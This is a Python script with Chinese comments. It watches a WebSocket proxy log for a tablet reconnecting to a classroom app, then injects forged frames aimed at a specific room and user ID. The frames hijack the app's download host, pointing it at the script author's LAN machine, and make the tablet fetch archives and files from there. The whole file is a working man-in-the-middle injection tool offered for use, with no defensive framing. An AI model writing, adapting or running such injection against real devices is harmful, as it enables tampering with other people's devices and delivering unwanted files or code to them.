# -*- coding: utf-8 -*-
"""ws_reconnect_autoburst.py - 守望器: 一旦 ws8889 捕捉到**新的 WS 握手**, 立刻自动打完整注入序列。

背景: ws8889 只在握手瞬间建立流状态; 若平板用的是"重启前"建立的连接, 注入不会生效。
      => 平板每次重连, 本守望器自动在 2~3 秒内完成全套注入。
"""
import io
import json
import os
import re
import time

BASE = os.path.dirname(os.path.abspath(__file__))
WS = os.path.join(BASE, "ws8889.log")
INJ = os.path.join(BASE, "ws_inject.txt")
LOG = os.path.join(BASE, "autoburst.log")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"


def W(m):
    line = "%s %s" % (time.strftime("%H:%M:%S"), m)
    try:
        with io.open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass
    print(line, flush=True)


def tail(p, n=400):
    try:
        with io.open(p, encoding="utf-8", errors="replace") as f:
            return f.readlines()[-n:]
    except Exception:
        return []


def frame(mtype, data, cid, tag, cmd=2):
    return json.dumps({
        "cId": cid, "cmd": cmd, "from": "10001", "gt": 0, "id": "1349658", "rt": 1,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
        "tags": ["RWYZKUIF"]}, ensure_ascii=False)


def burst(seq):
    """在握手后立即注入: 50001 劫持 -> 短语下载 -> 任务变体 -> 重定向"""
    n = 0
    steps = [
        ("50001", frame(50001, json.dumps({"port": 80, "hostName": OUR, "rootPath": "/xh",
                                           "downloadWaitTime": 0, "startLimitRate": 1.0}),
                        "1798%02d1" % seq, "default_tag")),
        ("type=3 b.7z", frame(3, json.dumps({"voiceId": "rb%d" % seq,
                                             "voiceUrl": "http://%s:80/rb%d.7z" % (OUR, seq)}),
                              "1798%02d2" % seq, "canvas_tag")),
        ("50001-2", frame(50001, json.dumps({"port": 80, "hostName": OUR, "rootPath": "/x2",
                                             "downloadWaitTime": 0, "startLimitRate": 1.0}),
                          "1798%02d3" % seq, "default_tag")),
        ("type=3 c.zip", frame(3, json.dumps({"voiceId": "rc%d" % seq,
                                              "voiceUrl": "http://%s:80/rc%d.zip" % (OUR, seq)}),
                               "1798%02d4" % seq, "canvas_tag")),
        ("cmd=11", frame(0, "", "1798%02d5" % seq, "default_tag", cmd=11)),
        ("20003", frame(20003, "", "1798%02d6" % seq, "server_tag")),
        ("20005", frame(20005, json.dumps({"id": "1349658", "answerName": "t",
                                           "imgUrl": "http://%s:80/r%d.png" % (OUR, seq),
                                           "paintUrl": "http://%s:80/r%d.txt" % (OUR, seq)}),
                        "1798%02d7" % seq, "server_tag")),
    ]
    for name, js in steps:
        try:
            with io.open(INJ, "w", encoding="utf-8") as f:
                f.write(js)
            n += 1
            W("  -> %s" % name)
        except Exception as e:
            W("  err %r" % (e,))
        time.sleep(5)
    W("burst #%d done (%d frames)" % (seq, n))


if __name__ == "__main__":
    W("===== ws_reconnect_autoburst start =====")
    seen = set()
    for ln in tail(WS, 2000):
        if "accept=" in ln:
            seen.add(ln.split()[-1])
    seq = 0
    while True:
        time.sleep(5)
        try:
            for ln in tail(WS, 200):
                if "accept=" in ln and ln.split()[-1] not in seen:
                    seen.add(ln.split()[-1])
                    seq += 1
                    W("★★★ 新握手捕捉到(第 %d 次): %s" % (seq, ln.strip()[:120]))
                    time.sleep(3)
                    burst(seq)
        except Exception as e:
            W("loop err %r" % (e,))
